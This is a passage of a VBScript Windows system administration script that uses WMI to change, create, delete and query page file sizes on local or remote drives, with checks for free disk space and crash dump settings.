                                        If Err.Number Then
                                            Err.Clear
                                            WScript.Echo(L_InvalidInput_ErrorMessage)
                                            WScript.Quit(EXIT_INVALID_INPUT)
                                        End If
                                        component.VBPrintf GrowsToFreeSpaceWarningMessage, _
                                        Array(UCase(arrVolume(i)),intFreeSpace)
                                        strReply = getReply()
                                        If Trim(LCase(strReply)) = L_UserReplyYes_Text Then
                                            ' set the maxsize to be the free space on disk
                                            intMaxSize = intFreeSpace
                                            ' check if the given maxsize is greater than the existing initial size.
                                            If (CInt(intMaxSize) >= objInstance.InitialSize) Then
                                                If (CInt(intMaxSize) <> objInstance.MaximumSize) Then
                                                    intOldMaximumSize = objInstance.MaximumSize
                                                    objInstance.MaximumSize = intMaxSize
                                                    objInstance.Put_(CONST_WBEM_FLAG)
                                                    If Err.Number Then
                                                        Err.Clear
                                                        WScript.Echo(L_UpdateFailed_ErrorMessage)
                                                        WScript.Quit(EXIT_INVALID_INPUT)
                                                    End If
                                                    component.VBPrintf ChangeMaxSuccessMessage, _
                                                    Array(UCase(arrVolume(i)),CInt(intOldMaximumSize),CInt(intMaxSize))
                                                    blnSuccessMsg = TRUE
                                                Else
                                                    component.VBPrintf ChangeMaxSkippingMessage, Array(UCase(arrVolume(i)))
                                                End If
                                            Else
                                                ' get the upper bound allowed for maximum size
                                                intMaxSizeUB = getMaxSizeUB(objService)
                                                component.VBPrintf InsufficientMaxSizeErrorMessage, _
                                                Array( UCase(arrVolume(i)) , intMaxSizeUB )
                                            End If
                                        ElseIf LCase(strReply) = L_UserReplyNo_Text Then
                                            WScript.Quit(EXIT_SUCCESS)
                                        Else
                                            WScript.Echo(L_InvalidInput_ErrorMessage)
                                            WScript.Quit (EXIT_INVALID_INPUT)
                                        End If
                                    Else
                                        If (CInt(intMaxSize) >= objInstance.InitialSize) Then
                                            If (CInt(intMaxSize) <> objInstance.MaximumSize) Then
                                                intOldMaximumSize = objInstance.MaximumSize
                                                objInstance.MaximumSize = intMaxSize
                                                objInstance.Put_(CONST_WBEM_FLAG)
                                                If Err.Number Then
                                                    Err.Clear
                                                    WScript.Echo(L_UpdateFailed_ErrorMessage)
                                                    WScript.Quit(EXIT_INVALID_INPUT)
                                                End If
                                                component.VBPrintf ChangeMaxSuccessMessage, _
                                                Array(UCase(arrVolume(i)),CInt(intOldMaximumSize),CInt(intMaxSize))
                                                blnSuccessMsg = TRUE
                                            Else
                                                component.VBPrintf ChangeMaxSkippingMessage, Array(UCase(arrVolume(i)))
                                            End If
                                        Else
                                            ' get the upper bound allowed for maximum size
                                            intMaxSizeUB = getMaxSizeUB(objService)
                                            component.VBPrintf InsufficientMaxSizeErrorMessage, _
                                            Array( UCase(arrVolume(i)) , intMaxSizeUB )
                                        End If
                                    End If
                                End If
                            Else
                                ' Check if maxsize specified as 0
                                If Len(intMaxSize) > 0 Then
                                    ' get the upper bound allowed for maximum size
                                    intMaxSizeUB = getMaxSizeUB(objService)
                                    component.VBPrintf InsufficientMaxSizeErrorMessage, _
                                    Array( UCase(arrVolume(i)) , intMaxSizeUB )
                                End If
                            End If ' maxsize checked

                        Else

                            ' Case when both initsize and maxsize are selected

                            ' check if maxsize is greater than initsize
                            ' this will detect any overflow problems, if any
                            If CLng(intIntSize) > CLng(intMaxSize) Then
                                ' check for overflows and clear the error
                                If Err.Number Then Err.Clear
                                ' get the upper bound allowed for maximum size
                                intMaxSizeUB = getMaxSizeUB(objService)
                                component.VBPrintf InsufficientMaxSizeErrorMessage, _
                                Array( UCase(arrVolume(i)) , intMaxSizeUB )
                                WScript.Quit(EXIT_INVALID_INPUT)
                            End If

                            If (intIntSize > 0) Then
                                ' Check if initsize is greater than 2 MB
                                If CLng(intIntSize) >= CLng(INITIAL_SIZE_LB) Then
                                    ' check for overflows
                                    If Err.Number Then
                                        Err.Clear
                                        ' get the upper bound allowed for maximum size
                                        intMaxSizeUB = getMaxSizeUB(objService)
                                        component.VBPrintf InsufficientMaxSizeErrorMessage, _
                                        Array( UCase(arrVolume(i)) , intMaxSizeUB )
                                        WScript.Quit(EXIT_INVALID_INPUT)
                                    End If

                                    ' get the free space available on the specified disk
                                    intFreeDiskSpace = getFreeSpaceOnDisk(strDriveName,objService)
                                    ' get the current pagefile size
                                    intCurrentSize = getCurrentPageFileSize(objService,objInstance)
                                    ' get the total free space
                                    If Len(intCurrentSize) > 0 Then
                                        intFreeSpace = intFreeDiskSpace + intCurrentSize
                                    Else
                                        WScript.Echo(L_UnableToRetrieveInfo_ErrorMessage)
                                        WScript.Quit(EXIT_QUERY_FAIL)
                                    End If

                                    ' check if it is greater than free disk space
                                    If CLng(intIntSize) > CLng(intFreeSpace) Then
                                        ' check for overflows
                                        If Err.Number Then
                                            Err.Clear
                                            ' get the upper bound allowed for maximum size
                                            intMaxSizeUB = getMaxSizeUB(objService)
                                            component.VBPrintf InsufficientMaxSizeErrorMessage, _
                                            Array( UCase(arrVolume(i)) , intMaxSizeUB )
                                            WScript.Quit(EXIT_INVALID_INPUT)
                                        End If
                                        WScript.Echo(NotEnoughSpaceErrorMessage)
                                        WScript.Quit(EXIT_INVALID_INPUT)
                                    End If

                                    If CLng(intIntSize) > CLng(intFreeSpace) - 5 Then
                                        ' check for overflows
                                        If Err.Number Then
                                            Err.Clear
                                            WScript.Echo(L_InvalidInput_ErrorMessage)
                                            WScript.Quit(EXIT_INVALID_INPUT)
                                        End If
                                        WScript.Echo(AtLeastFiveMBErrorMessage)
                                        WScript.Quit(EXIT_INVALID_INPUT)
                                    Else
                                        ' get the crash dump setting value
                                        intCrashDump = GetCrashDumpSetting(strUserName,strPassword,strMachine)
                                        ' get the Physical Memory Size
                                        intMemSize = GetPhysicalMemorySize(strHostName,objService)
                                        ' If the user has selected "yes" for the warning message
                                        If isCrashDumpValueSet(intCrashDump,intIntSize,intMemSize,arrVolume(i)) Then
                                            ' store the old initsize value
                                            intOldInitialSize = objInstance.InitialSize
                                            ' set the new initsize
                                            objInstance.InitialSize = intIntSize
                                            ' check if maxsize is given
                                            If (intMaxSize > 0) Then
                                                ' Get the Disk Size for the specified drive
                                                intDiskSize = GetDiskSize(arrVolume(i),objService)
                                                ' check if maxsize is more than initsize
                                                If (CLng(intMaxSize) > CLng(intDiskSize)) Then
                                                    ' check for overflows
                                                    If Err.Number Then
                                                        Err.Clear
                                                        ' get the upper bound allowed for maximum size
                                                        intMaxSizeUB = getMaxSizeUB(objService)
                                                        component.VBPrintf InsufficientMaxSizeErrorMessage, _
                                                        Array( UCase(arrVolume(i)) , intMaxSizeUB )
                                                        WScript.Quit(EXIT_INVALID_INPUT)
                                                    End If
                                                    component.VBPrintf DiskTooSmallErrorMessage, _
                                                    Array(UCase(arrVolume(i)))
                                                Else
                                                    If (CLng(intMaxSize) > CLng(intFreeSpace)) Then
                                                        ' check for overflows
                                                        If Err.Number Then
                                                            Err.Clear
                                                            WScript.Echo(L_InvalidInput_ErrorMessage)
                                                            WScript.Quit(EXIT_INVALID_INPUT)
                                                        End If
                                                        component.VBPrintf GrowsToFreeSpaceWarningMessage, _
                                                        Array(UCase(arrVolume(i)),intFreeSpace)
                                                        strReply = getReply()
                                                        If Trim(LCase(strReply)) = L_UserReplyYes_Text Then
                                                            ' set the maxsize to be the free space on disk
                                                            intMaxSize = intFreeSpace
                                                            intOldMaximumSize = objInstance.MaximumSize
                                                            objInstance.MaximumSize = intMaxSize
                                                            If ( CInt(intIntSize) <> intOldInitialSize ) Then
                                                                objInstance.Put_(CONST_WBEM_FLAG)
                                                                If Err.Number Then
                                                                    Err.Clear
                                                                    WScript.Echo(L_UpdateFailed_ErrorMessage)
                                                                    WScript.Quit(EXIT_INVALID_INPUT)
                                                                End If
                                                                component.VBPrintf ChangeIntSuccessMessage, _
                                                                Array(UCase(arrVolume(i)),CInt(intOldInitialSize),CInt(intIntSize))
                                                                blnSuccessMsg = TRUE
                                                            Else
                                                                component.VBPrintf ChangeIntSkippingMessage, _
                                                                Array(UCase(arrVolume(i)))
                                                            End If
                                                            If (CInt(intMaxSize) <> intOldMaximumSize) Then
                                                                objInstance.Put_(CONST_WBEM_FLAG)
                                                                If Err.Number Then
                                                                    Err.Clear
                                                                    WScript.Echo(L_UpdateFailed_ErrorMessage)
                                                                    WScript.Quit(EXIT_INVALID_INPUT)
                                                                End If
                                                                component.VBPrintf ChangeMaxSuccessMessage, _
                                                                Array(UCase(arrVolume(i)),CInt(intOldMaximumSize),CInt(intMaxSize))
                                                                blnSuccessMsg = TRUE
                                                            Else
                                                                component.VBPrintf ChangeMaxSkippingMessage, _
                                                                Array(UCase(arrVolume(i)))
                                                            End If
                                                        ElseIf LCase(strReply) = L_UserReplyNo_Text Then
                                                            WScript.Quit(EXIT_SUCCESS)
                                                        Else
                                                            WScript.Echo(L_InvalidInput_ErrorMessage)
                                                            WScript.Quit (EXIT_INVALID_INPUT)
                                                        End If
                                                    Else
                                                        intOldMaximumSize = objInstance.MaximumSize
                                                        objInstance.MaximumSize = intMaxSize
                                                        objInstance.Put_(CONST_WBEM_FLAG)
                                                        If Err.Number Then
                                                            Err.Clear
                                                            WScript.Echo(L_UpdateFailed_ErrorMessage)
                                                            WScript.Quit(EXIT_INVALID_INPUT)
                                                        End If

                                                        If (CInt(intIntSize) <> intOldInitialSize ) Then
                                                            component.VBPrintf ChangeIntSuccessMessage, _
                                                            Array(UCase(arrVolume(i)),CInt(intOldInitialSize),CInt(intIntSize))
                                                            blnSuccessMsg = TRUE
                                                        Else
                                                            component.VBPrintf ChangeIntSkippingMessage, Array(UCase(arrVolume(i)))
                                                        End If

                                                        If (CInt(intMaxSize) <> intOldMaximumSize) Then
                                                            component.VBPrintf ChangeMaxSuccessMessage, _
                                                            Array(UCase(arrVolume(i)),CInt(intOldMaximumSize),CInt(intMaxSize))
                                                            blnSuccessMsg = TRUE
                                                        Else
                                                            component.VBPrintf ChangeMaxSkippingMessage, Array(UCase(arrVolume(i)))
                                                        End If
                                                    End If
                                                End If
                                            Else
                                                ' Check if maxsize specified as 0
                                                If Len(intMaxSize) > 0 Then
                                                    ' get the upper bound allowed for maximum size
                                                    intMaxSizeUB = getMaxSizeUB(objService)
                                                    component.VBPrintf InsufficientMaxSizeErrorMessage, _
                                                    Array( UCase(arrVolume(i)) , intMaxSizeUB )
                                                End If
                                            End If ' maxsize checked
                                        End If
                                    End If
                                Else
                                    ' get the upper bound allowed for maximum size
                                    intMaxSizeUB = getMaxSizeUB(objService)
                                    component.VBPrintf InitialSizeRangeErrorMessage, _
                                    Array(intMaxSizeUB)
                                    WScript.Quit(EXIT_INVALID_INPUT)
                                End If
                            Else
                                ' Check if initsize specified as 0
                                If Len(intIntSize) > 0 Then
                                    ' get the upper bound allowed for maximum size
                                    intMaxSizeUB = getMaxSizeUB(objService)
                                    component.VBPrintf InitialSizeRangeErrorMessage, _
                                    Array(intMaxSizeUB)
                                    WScript.Quit(EXIT_INVALID_INPUT)
                                End If
                            End If ' initsize checked
                        End If
                    End If
                Next
            Else
                component.VBPrintf L_PageFileDoesNotExist_ErrorMessage, _
                Array(UCase(arrVolume(i)))
            End If
        Else
            ' the drive does not exist
            component.VBPrintf L_InvalidVolumeName_ErrorMessage, _
            Array(UCase(arrVolume(i)))
            ' remove the drive name from the valid drives list
            objVols.Remove arrVolume(i)
            ' decrement the loop count
            i = i - 1
            ' check for the no.of valid drive names from the specified list.
            If Cint(objVols.Count) = 0 Then
                WScript.Quit(EXIT_INVALID_INPUT)
            Else
                intVolumes = objVols.Count
                arrVolume  = objVols.keys
            End If
        End If
        i = i + 1
    Loop

    If blnSuccessMsg = TRUE then
        WScript.Echo L_RestartComputer_Message
    End If

End Sub

'******************************************************************************
'* Sub:     ProcessCreate
'*
'* Purpose: Creates new page files with the given specifications
'*
'* Input:
'*  [in]    strMachine         machine to configure page files on
'*  [in]    strUserName        user name to connect to the machine
'*  [in]    strPassword        password for the user
'*  [in]    intIntSize         the initial size for the page file
'*  [in]    intMaxSize         the maximum size for the page file
'*  [in]    objVols            the object containing volume names
'*
'* Output:  Displays error message and quits if connection fails
'*
'******************************************************************************
Private Sub ProcessCreate( ByVal strMachine,  _
                           ByVal strUserName, _
                           ByVal strPassword, _
                           ByVal intIntSize,  _
                           ByVal intMaxSize,  _
                           ByVal objVols      )

    ON ERROR RESUME NEXT
    Err.Clear

    Dim arrVolume             ' to store all the volumes specified
    Dim intVolumes            ' to store the no.of volumes specified
    Dim strQuery              ' to store the query for pagefiles
    Dim strQueryDisk          ' to store the query for disk
    Dim strQueryComp          ' to store the query for getting host name
    Dim objService            ' service object
    Dim objInst               ' instance object
    Dim objInstance           ' instance object
    Dim objNewInstance        ' instance object
    Dim objEnum               ' collection object for query results
    Dim objEnumforDisk        ' collection object for query results
    Dim blnSuccessMsg         ' flag to check if a SUCCESS message is generated
    Dim intFreeSpace          ' to store total free space
    Dim intFreeDiskSpace      ' to store free disk space
    Dim intCurrentSize        ' to store the current pagefile size
    Dim intDiskSize           ' to store the disk size for the specified disk
    Dim intMemSize            ' to store physical memory size
    Dim intCrashDump          ' to store the current crash dump setting value
    Dim strReply              ' to store the user reply
    Dim strHostName           ' to store the host name
    Dim intMaxSizeUB          ' to store the upper bound for maximum size
    Dim i                     ' Loop variable

    ' variables used only if * is specified
    Dim objEnumerator         ' collection object for query results

    i = 0
    intFreeSpace      = 0
    intFreeDiskSpace  = 0
    intCurrentSize    = 0
    intMaxSizeUB      = 0
'    intIntSize        = CLng(intIntSize)
'    intMaxSize        = CLng(intMaxSize)
    blnSuccessMsg     = FALSE

    If NOT component.wmiConnect(CONST_NAMESPACE_CIMV2 , _
                      strUserName , _
                      strPassword , _
                      strMachine  , _
                      blnLocalConnection , _
                      objService  ) Then
        WScript.Echo(L_HintCheckConnection_Message)
        WScript.Quit(EXIT_METHOD_FAIL)
    End If

    If (objVols.Exists("*")) Then
        ' build the query
        intVolumes = 0
        ' get all the drive names with drive type = 3 (other than floppy drive & CDROM Drive)
        strQuery = "Select DeviceID From " & CLASS_LOGICAL_DISK & _
        " where DriveType = " & DRIVE_TYPE
        ' execute the query
        Set objEnumerator = objService.ExecQuery(strQuery, "WQL", 48, null)
        ' check for any errors
        If Err.Number Then
            Err.Clear
            WScript.Echo(L_UnableToRetrieveInfo_ErrorMessage)
            WScript.Quit(EXIT_QUERY_FAIL)
        End If

        For each objInstance in objEnumerator
            ' check if the volumename is not an alias name and neither a mapped drive.
            If IsValidPhysicalDrive(objService, objInstance.DeviceID) Then
                ' check if the volume name is specified more than once.
                If NOT objVols.Exists(LCase(objInstance.DeviceID)) Then
                    objVols.Add LCase(objInstance.DeviceID),-1
                End If
            End If
        Next
        ' Remove * from objVols after adding the drives to the object.
        objVols.Remove "*"
    End If

    intVolumes = objVols.Count
    arrVolume  = objVols.Keys

    ' Get the host Name - used to get Crash Dump Settings
    strQueryComp = "Select * From " & CLASS_COMPUTER_SYSTEM
    Set objEnum = objService.ExecQuery(strQueryComp, "WQL", 0, null)
    ' check for any errors
    If Err.Number Then
        Err.Clear
        WScript.Echo(L_UnableToRetrieveInfo_ErrorMessage)
        WScript.Quit(EXIT_QUERY_FAIL)
    End If

    For each objInst in objEnum
        If NOT ISEmpty(objInst.Name) Then
            strHostName = objInst.Name
        Else
            WSCript.Echo(L_UnableToRetrieveInfo_ErrorMessage)
            WScript.Quit(EXIT_QUERY_FAIL)
        End If
    Next

    ' No wild Cards Specified
    Do While( i < intVolumes )

        strQueryDisk = "Select * From " & CLASS_LOGICAL_DISK & _
        " where DriveType = " & DRIVE_TYPE & " and DeviceID = '" & arrVolume(i) & "'"
        Set objEnumforDisk = objService.ExecQuery(strQueryDisk, "WQL", 0, null)

        strQuery = "Select * From " & CLASS_PAGE_FILE_SETTING & _
        " where Name = '" & arrVolume(i) & "\" & PAGEFILE_DOT_SYS & "'"
        Set objEnum = objService.ExecQuery(strQuery, "WQL", 0, null)

        ' If valid drive and pagefile exists on that drive
        If (objEnumforDisk.Count = 0 AND objEnum.Count = 0 ) Then
            ' the drive does not exist
            component.VBPrintf L_InvalidVolumeName_ErrorMessage, _
            Array(UCase(arrVolume(i)))
            ' remove the drive name from the valid drives list
            objVols.Remove arrVolume(i)
            ' decrement the loop count
            i = i - 1
            ' check for the no.of valid drive names from the specified list.
            If Cint(objVols.Count) = 0 Then
                WScript.Quit(EXIT_INVALID_INPUT)
            Else
                intVolumes = objVols.Count
                arrVolume  = objVols.keys
            End If
        Else
            ' SKIP - if at least one instance is found then dont create a new instance
            If (objEnumforDisk.Count = 1 AND objEnum.Count = 1) Then
                component.VBPrintf L_CreateSkipping_Message, _
                Array(UCase(arrVolume(i)))
            Else
                ' check if the volumename is an alias name or a mapped drive
                If NOT IsValidPhysicalDrive(objService, arrVolume(i)) Then
                    component.VBPrintf L_InvalidPhysicalDrive_ErrorMessage, _
                    Array(UCase(arrVolume(i)))
                Else
                    ' set the security privilege to allow pagefile creation
                    objService.Security_.Privileges.AddAsString("SeCreatePagefilePrivilege")
                    If Err.Number then
                        Err.Clear
                        WScript.Echo("ERROR: Failed to set the security privilege.")
                        WScript.Quit(EXIT_METHOD_FAIL)
                    End If

                    Set objInstance = objService.Get(CLASS_PAGE_FILE_SETTING)
                    ' check for any errors
                    If Err.Number Then
                        Err.Clear
                        WScript.Echo(L_CannotCreate_ErrorMessage)
                        WScript.Quit(EXIT_METHOD_FAIL)
                    End If

                    Set objNewInstance = objInstance.SpawnInstance_
                    ' check for any errors
                    If Err.Number Then
                        Err.Clear
                        WScript.Echo(L_CannotCreate_ErrorMessage)
                        WScript.Quit(EXIT_INVALID_INPUT)
                    End If

                    ' append the filename to the volume name
                    objNewInstance.Name = UCase(arrVolume(i)) & PAGEFILE_DOT_SYS

                    ' check if maxsize is greater than initsize
                    ' this will detect any overflow problems, if any
                    If ( CLng(intIntSize) > CLng(intMaxSize) ) Then
                        ' check for overflows and clear the error
                        If Err.Number Then Err.Clear
                        ' get the upper bound allowed for maximum size
                        intMaxSizeUB = getMaxSizeUB(objService)
                        component.VBPrintf InsufficientMaxSizeErrorMessage, _
                        Array( UCase(arrVolume(i)) , intMaxSizeUB )
                        WScript.Quit(EXIT_INVALID_INPUT)
                    End If

                    ' Check the initial size with the free space on the disk
                    If CLng(intIntSize) >= CLng(INITIAL_SIZE_LB) Then
                        ' check for overflows
                        If Err.Number Then
                            Err.Clear
                            WScript.Echo(L_InvalidInput_ErrorMessage)
                            WScript.Quit(EXIT_INVALID_INPUT)
                        End If
                        ' get the free space on the specified disk
                        intFreeDiskSpace = getFreeSpaceOnDisk(arrVolume(i),objService)
                        ' get the current pagefile size
                        intCurrentSize = getCurrentPageFileSize(objService,objInstance)
                        ' get the total free space
                        '     Since its a new instance the current size will
                        '     NOT be available. So the initial size is taken 
                        '     into considerarion for calculating the total 
                        '     free space.
                        intFreeSpace = intFreeDiskSpace + intIntSize

                        ' Check if it greater than free disk space
                        If CLng(intIntSize) > CLng(intFreeSpace) Then
                            ' check for overflows
                            If Err.Number Then
                                Err.Clear
                                WScript.Echo(L_InvalidInput_ErrorMessage)
                                WScript.Quit(EXIT_INVALID_INPUT)
                            End If
                            WScript.Echo(NotEnoughSpaceErrorMessage)
                            WScript.Quit(EXIT_INVALID_INPUT)
                        End If

                        If CLng(intIntSize) > CLng(intFreeSpace) - 5 Then
                            ' check for overflows
                            If Err.Number Then
                                Err.Clear
                                WScript.Echo(L_InvalidInput_ErrorMessage)
                                WScript.Quit(EXIT_INVALID_INPUT)
                            End If
                            WScript.Echo(AtLeastFiveMBErrorMessage)
                            WScript.Quit(EXIT_INVALID_INPUT)
                        End If

                        ' get the crash dump setting value
                        intCrashDump = GetCrashDumpSetting(strUserName,strPassword,strMachine)
                        ' get the Physical Memory Size
                        intMemSize = GetPhysicalMemorySize(strHostName,objService)
                        ' check if the user has selected "yes" for the warning message
                        If isCrashDumpValueSet(intCrashDump,intIntSize,intMemSize,arrVolume(i)) Then
                            objNewInstance.InitialSize = CInt(intIntSize)
                            ' Get the Disk Size for the specified drive
                            intDiskSize = GetDiskSize(arrVolume(i),objService)
                            If (CLng(intMaxSize) > CLng(intDiskSize)) Then
                                ' check for overflows
                                If Err.Number Then
                                    Err.Clear
                                    ' get the upper bound allowed for maximum size
                                    intMaxSizeUB = getMaxSizeUB(objService)
                                    component.VBPrintf InsufficientMaxSizeErrorMessage, _
                                    Array( UCase(arrVolume(i)) , intMaxSizeUB )
                                    WScript.Quit(EXIT_INVALID_INPUT)
                                End If
                                component.VBPrintf DiskTooSmallErrorMessage, _
                                Array(UCase(arrVolume(i)))
                            Else
                                If (CLng(intMaxSize) > CLng(intFreeSpace)) Then
                                    ' check for overflows
                                    If Err.Number Then
                                        Err.Clear
                                        WScript.Echo(L_InvalidInput_ErrorMessage)
                                        WScript.Quit(EXIT_INVALID_INPUT)
                                    End If
                                    component.VBPrintf GrowsToFreeSpaceWarningMessage, _
                                    Array(UCase(arrVolume(i)),intFreeSpace)
                                    strReply = getReply()
                                    If Trim(LCase(strReply)) = L_UserReplyYes_Text Then
                                        ' maxsize can grow only to the free disk space available.
                                        ' set the maxsize to the free space on disk.
                                        intMaxSize = intFreeSpace
                                        objNewInstance.MaximumSize = intMaxSize
                                        objNewInstance.Put_(CONST_WBEM_FLAG)
                                        If Err.Number Then
                                            Err.Clear
                                            WScript.Echo(L_CannotCreate_ErrorMessage)
                                            WScript.Quit(EXIT_INVALID_INPUT)
                                        End If
                                        component.VBPrintf CreateSuccessMessage, _
                                        Array(CInt(intIntSize),CInt(intMaxSize),UCase(arrVolume(i)))
                                        blnSuccessMsg = TRUE
                                    ElseIf LCase(strReply) = L_UserReplyNo_Text Then
                                        WScript.Quit(EXIT_SUCCESS)
                                    Else
                                        WScript.Echo(L_InvalidInput_ErrorMessage)
                                        WScript.Quit (EXIT_INVALID_INPUT)
                                    End If
                                Else
                                    objNewInstance.MaximumSize = CInt(intMaxSize)
                                    objNewInstance.Put_(CONST_WBEM_FLAG)
                                    If Err.Number Then
                                        Err.Clear
                                        WScript.Echo(L_CannotCreate_ErrorMessage)
                                        WScript.Quit(EXIT_INVALID_INPUT)
                                    End If
                                    component.VBPrintf CreateSuccessMessage, _
                                    Array(CInt(intIntSize),CInt(intMaxSize),UCase(arrVolume(i)))
                                    blnSuccessMsg = TRUE
                                End If
                            End If
                        End If
                    Else
                        ' get the upper bound allowed for maximum size
                        intMaxSizeUB = getMaxSizeUB(objService)
                        component.VBPrintf InitialSizeRangeErrorMessage, Array(intMaxSizeUB)
                    End If
                End If
            End If
        End If
        i = i + 1
    Loop

    If blnSuccessMsg = TRUE then
        WScript.Echo L_RestartComputer_Message
    End If

End Sub

'******************************************************************************
'* Sub:     ProcessDelete
'*
'* Purpose: Deletes existing page files on the specified volumes
'*
'* Input:
'*  [in]    strMachine         machine to configure page files on
'*  [in]    strUserName        user name to connect to the machine
'*  [in]    strPassword        password for the user
'*  [in]    objVols            the object containing volume names
'*
'* Output:  Displays error message and quits if connection fails
'*
'******************************************************************************
Private Sub ProcessDelete ( ByVal strMachine,  _
                            ByVal strUserName, _
                            ByVal strPassword, _
                            ByVal objVols      )
    ON ERROR RESUME NEXT
    Err.Clear

    Dim arrVolume             ' to store all the volumes specified
    Dim intVolumes            ' to store the no.of volumes specified
    Dim objService            ' service object
    Dim objInstance           ' instance object
    Dim blnSuccessMsg         ' flag to check if a SUCCESS message is generated
    Dim strQueryDisk          ' to store the query for disk
    Dim objEnumforDisk        ' collection object for query results
    Dim intMemSize            ' to store physical memory size
    Dim intCrashDump          ' to store the current crash dump setting value
    Dim strQueryComp          ' to store the query for computersystem
    Dim objEnum               ' collection object for query results
    Dim objInst               ' instance object
    Dim strHostName           ' to store the host name
    Dim i                     ' Loop variable

    If NOT component.wmiConnect(CONST_NAMESPACE_CIMV2 , _
                          strUserName , _
                          strPassword , _
                          strMachine  , _
                          blnLocalConnection , _
                          objService  ) Then
            WScript.Echo(L_HintCheckConnection_Message)
            WScript.Quit(EXIT_METHOD_FAIL)
    End If

    i = 0
    blnSuccessMsg = FALSE
    intVolumes    = objVols.Count
    arrVolume     = objVols.Keys

    ' Get the host Name - used to get Crash Dump Settings
    strQueryComp = "Select * From " & CLASS_COMPUTER_SYSTEM
    Set objEnum = objService.ExecQuery(strQueryComp, "WQL", 0, null)
    ' check for any errors
    If Err.Number Then
        Err.Clear
        WScript.Echo(L_UnableToRetrieveInfo_ErrorMessage)
        WScript.Quit(EXIT_QUERY_FAIL)
    End If

    For each objInst in objEnum
        If NOT ISEmpty(objInst.Name) Then
            strHostName = objInst.Name
        Else
            WSCript.Echo(L_UnableToRetrieveInfo_ErrorMessage)
            WScript.Quit(EXIT_QUERY_FAIL)
        End If
    Next

    Do While( i < intVolumes )
        strQueryDisk = "Select * From " & CLASS_LOGICAL_DISK & _
        " where DriveType = " & DRIVE_TYPE & " and DeviceID = '" & arrVolume(i) & "'"
        Set objEnumforDisk = objService.ExecQuery(strQueryDisk, "WQL", 0, null)
        If objEnumforDisk.Count > 0 Then
            Set objInstance = objService.Get(CLASS_PAGE_FILE_SETTING & "='" & _
            arrVolume(i) & PAGEFILE_DOT_SYS & "'")
            If Err.Number Then
                Err.Clear
                component.VBPrintf L_PageFileDoesNotExist_ErrorMessage, _
                Array(UCase(arrVolume(i)))
            Else
                ' check for system managed pagefiles
                If (objInstance.InitialSize = 0 AND objInstance.MaximumSize = 0) Then
                    component.VBPrintf L_SystemManagedSize_ErrorMessage, _
                    Array(UCase(arrVolume(i)))
                Else
                    ' get the crash dump setting value
                    intCrashDump = GetCrashDumpSetting(strUserName,strPassword,strMachine)
                    ' get the Physical Memory Size
                    intMemSize = GetPhysicalMemorySize(strHostName,objService)
                    ' If the user has selected "yes" for the warning message
                    ' pass initsize as 0 because initsize = maxsize = 0 (assumed) after deletion
                    If isCrashDumpValueSet(intCrashDump,0,intMemSize,arrVolume(i)) Then
                        ' Delete the instance
                        objInstance.Delete_
                        ' check for any errors
                        If Err.Number Then
                            Err.Clear
                            WScript.Echo(L_InvalidInput_ErrorMessage)
                            WScript.Quit(EXIT_INVALID_INPUT)
                        End If

                        component.VBPrintf L_DeleteSuccess_Message, _
                        Array(UCase(arrVolume(i)))
                        blnSuccessMsg = TRUE
                    End If
                End If
            End If
        Else
            ' the drive does not exist
            component.VBPrintf L_InvalidVolumeName_ErrorMessage, _
            Array(UCase(arrVolume(i)))
            ' remove the drive name from the valid drives list
            objVols.Remove arrVolume(i)
            ' decrement the loop count
            i = i - 1
            ' check for the no.of valid drive names from the specified list.
            If Cint(objVols.Count) = 0 Then
                WScript.Quit(EXIT_INVALID_INPUT)
            Else
                intVolumes = objVols.Count
                arrVolume  = objVols.keys
            End If
        End If
        i = i + 1
    Loop

' The instances of the following classes are also deleted along with the Win32_PageFile instances
' Win32_PageFileUsage - instances are deleted only after reboot
' Win32_PageFileSetting - instances are deleted automatically along with Win32_PageFile instances

    If blnSuccessMsg = TRUE then
        WScript.Echo L_RestartComputer_Message
    End If

End sub

'******************************************************************************
'* Sub:     ProcessQuery
'*
'* Purpose: Displays the Page File Details in the specified format
'*
'* Input:
'*  [in]    strMachine         machine to configure page files on
'*  [in]    strUserName        user name to connect to the machine
'*  [in]    strPassword        password for the user
'*  [in]    strFormat          the query display format
'*
'* Output:  Displays error message and quits if connection fails
'*          Calls component.showResults() to display the page file
'*          details
'*
'******************************************************************************
Private Sub ProcessQuery(   ByVal strMachine,  _
                            ByVal strUserName, _
                            ByVal strPassword, _
                            ByVal strFormat    )

    ON ERROR RESUME NEXT
    Err.Clear

    Dim objEnumerator            ' to store the results of the query is executed
    Dim objInstance              ' to refer to the instances of the objEnumerator
    Dim strQuery                 ' to store the query obtained for given conditions
    Dim intTotSize               ' to store the total size on all drives
    Dim intRecommendedSize       ' to store the recommended size for all drives
    Dim arrResultsDrives         ' to store the columns of page file info.
    Dim arrHeaderDrives          ' to store the array header values
    Dim arrMaxLengthDrives       ' to store the maximum length for each column
    Dim arrFinalResultsDrives    ' used to send the arrResults to ShowResults()
    Dim intColumnCountDrives     ' number of columns to be displayed in the output
    Dim blnPrintHeaderDrives     ' variable which decides whether header is to be displayed or not
    Dim arrResultsSummary        ' to store the columns of page file info.
    Dim arrHeaderSummary         ' to store the array header values
    Dim arrMaxLengthSummary      ' to store the maximum length for each column
    Dim arrFinalResultsSummary   ' used to send the arrResults to ShowResults()
    Dim intColumnCountSummary    ' number of columns to be displayed in the output
    Dim blnPrintHeaderSummary    ' variable which decides whether header is to be displayed or not
    Dim objDiskDriveInstance     ' Instance for drive name
    Dim objMemSizeInstance       ' Instance for memory size
    Dim arrblnNoDisplayDrives    ' boolean variable for -noheader option
    Dim arrblnNoDisplaySummary   ' boolean variable for -noheader option
    Dim objService               ' service object
    Dim strDriveName             ' to store the drive name
    Dim objUsageInstance         ' Instance for PageFileUsage

    ' Initializing the blnPrintHeaders to true. Header should be printed by default
    blnPrintHeaderDrives = TRUE
    blnPrintHeaderSummary = TRUE
    intTotSize = 0

    If NOT component.wmiConnect(CONST_NAMESPACE_CIMV2 , _
                          strUserName , _
                          strPassword , _
                          strMachine  , _
                          blnLocalConnection , _
                          objService  ) Then
            WScript.Echo(L_HintCheckConnection_Message)
            WScript.Quit(EXIT_METHOD_FAIL)
    End If

    arrHeaderDrives = Array(L_ColHeaderHostname_Text   , L_ColHeaderDrive_Text, _
                            L_ColHeaderVolumeLabel_Text, L_ColHeaderFileName_Text, _
                            L_ColHeaderInitialSize_Text, L_ColHeaderMaximumSize_Text, _
                            L_ColHeaderCurrentSize_Text, L_ColHeaderFreeSpace_Text)

    arrHeaderSummary = Array(L_ColHeaderHostname_Text, L_ColHeaderTotalMinimumSize_Text, _
